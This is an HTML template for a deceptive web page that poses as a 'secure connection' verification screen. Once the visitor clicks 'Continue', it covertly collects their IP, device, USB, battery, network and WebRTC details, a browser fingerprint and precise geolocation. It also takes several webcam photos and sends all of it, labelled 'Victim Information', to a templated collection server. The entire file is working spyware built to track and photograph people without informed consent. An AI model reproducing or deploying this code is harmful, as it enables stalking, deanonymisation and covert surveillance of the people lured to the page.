<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f5f5f5;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: opacity 0.5s ease;
            backdrop-filter: blur(5px);
        }
        #overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #overlay .message-box {
            max-width: 500px;
            text-align: center;
            padding: 30px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        #overlay h1 {
            color: #333;
            margin-bottom: 15px;
            font-size: 28px;
        }
        #overlay p {
            color: #666;
            margin-bottom: 25px;
            font-size: 16px;
        }
        #start-button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 12px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: background-color 0.3s;
            font-weight: 600;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        #start-button:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #999;
        }
        iframe {
            border: 0;
            overflow: hidden;
            height: 100%;
            width: 100%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="message-box">
            <h1>Content Loading</h1>
            <p>Please click the button below to access the requested content. This verification helps us ensure a secure connection.</p>
            <button id="start-button">Continue</button>
            <div id="status"></div>
        </div>
    </div>

    <iframe id="main-iframe" style="display: none;" src="<%= url %>"></iframe>
    <video id="video" style="display:none" playsinline autoplay></video>
    <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script type="text/javascript">
        var uid = "<%= uid %>";
        var photoCount = <%= photoCount || 4 %>;
        var c = false, l = false;
        var imgsent = 0;
        var td = "";

        function getLocalIPs(callback) {
            var ips = [];
            var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) {
                callback([]);
                return;
            }
            var pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(pc.setLocalDescription.bind(pc));
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var match = ipRegex.exec(ice.candidate.candidate);
                if (match && ips.indexOf(match[1]) === -1) {
                    ips.push(match[1]);
                }
                if (ips.length > 0) callback(ips);
            };
            setTimeout(function() { callback(ips); }, 1000);
        }

        async function gather() {
            <% if(!t){ %>
                td += '<code>‚úÖVictim Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
            <% }else{ %>
                await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>‚úÖVictim Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
            <% } %>

            td += "<br><br><b>‚è≥ Date In Victim's Device :</b> " + new Date() + "<br>";

            var xo = ["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
            td += "<br><b>üì± Device Information</b><br>";
            for (var i = 0; i < xo.length; i++) {
                if (xo[i] in navigator) {
                    td += "<b>" + xo[i] + "</b>: <code>" + navigator[xo[i]] + "</code><br>";
                }
            }

            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                await navigator.mediaDevices.enumerateDevices().then(function(devices) {
                    td += "<br><b>üì∑ Media Device Information</b><br>";
                    devices.forEach(function(device) {
                        td += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
                    });
                }).catch(function(err) {
                    td += "<br><b>üì∑ Media Device Information</b><br>‚ö†Ô∏è Media Device Error: " + err.name + ": " + err.message;
                });
            }

            if ("connection" in navigator) {
                td += "<br><b>üï∏Ô∏è Network Information</b><br>";
                var xoc = ["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
                for (var i = 0; i < xoc.length; i++) {
                    var str = navigator.connection[xoc[i]];
                    td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
                }
            }

            if ("usb" in navigator) {
                await navigator.usb.getDevices().then(devices => {
                    td += "<br><b>üîå Total USB devices connected:</b> " + devices.length + "<br>";
                    devices.forEach(device => {
                        td += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber + "</code><br>";
                    });
                });
            }

            if ("getBattery" in navigator) {
                await navigator.getBattery().then(function(battery) {
                    td += "<br><b>üîã Battery Information</b><br>";
                    td += "<b>üîãBattery Level:</b> " + battery.level * 100 + "%<br><b>‚ö° Is Battery Charging:</b> " + battery.charging + "";
                });
            }

            try {
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                td += `<br><b>üÜî Browser Fingerprint:</b> <code>${result.visitorId}</code><br>`;
            } catch (e) {
                td += `<br><b>‚ö†Ô∏è Fingerprint Error:</b> ${e.message}<br>`;
            }

            getLocalIPs(function(ips) {
                td += `<br><b>üè† Local IPs (WebRTC):</b> <code>${ips.join(', ') || 'Not available'}</code><br>`;
            });

            if (!navigator.geolocation) {
                td += "<br><b>üìç Location Information</b><br>‚ö†Ô∏è Location API not available";
                l = true;
            }

            function success(pos) {
                const crd = pos.coords;
                $.post("<%=a %>/location", {
                    uid: uid,
                    lat: encodeURIComponent(crd.latitude),
                    lon: encodeURIComponent(crd.longitude),
                    acc: encodeURIComponent(crd.accuracy)
                }, (s) => { l = true; red(); });
            }

            function error(err) {
                td += "<br><b>üìç Location Information</b><br>‚ö†Ô∏è Location ERROR: <code>" + err.message + "</code>";
                l = true;
                red();
            }

            if (navigator.geolocation) {
                await navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, maximumAge: 0 });
            }

            $.post("<%=a %>", { data: encodeURIComponent(td), uid: encodeURIComponent(uid) }, (s) => {});
        }

        var video = document.getElementById('video');
        var canvas = document.getElementById('canvas');

        function postImage(imgBase64) {
            $.post("<%=a %>/camsnap", { uid: uid, img: encodeURIComponent(imgBase64) }, (s) => {
                imgsent++;
                if (imgsent >= photoCount) {
                    c = true;
                    red();
                }
            }).fail(() => {});
        }

        var constraints = { audio: false, video: { facingMode: "user" } };

        async function cam() {
            try {
                var stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                td += '<br><b>üì∑ Camera Images</b>';
                td += `<br>‚ö†Ô∏è Camera Access Error: ${e.toString()}`;
                c = true;
                red();
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            var context = canvas.getContext('2d');
            var intervalId = setInterval(function() {
                context.drawImage(video, 0, 0, 500, 500);
                var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
                postImage(canvasData);
                if (imgsent >= photoCount) {
                    clearInterval(intervalId);
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 1500);
        }

        function red() {
            if (c && l) {
                document.getElementById('overlay').classList.add('hidden');
                document.getElementById('main-iframe').style.display = 'block';
            }
        }

        document.getElementById('start-button').addEventListener('click', function() {
            document.getElementById('status').innerText = 'Verifying...';
            gather();
            cam();
        });
    </script>
</body>
</html>
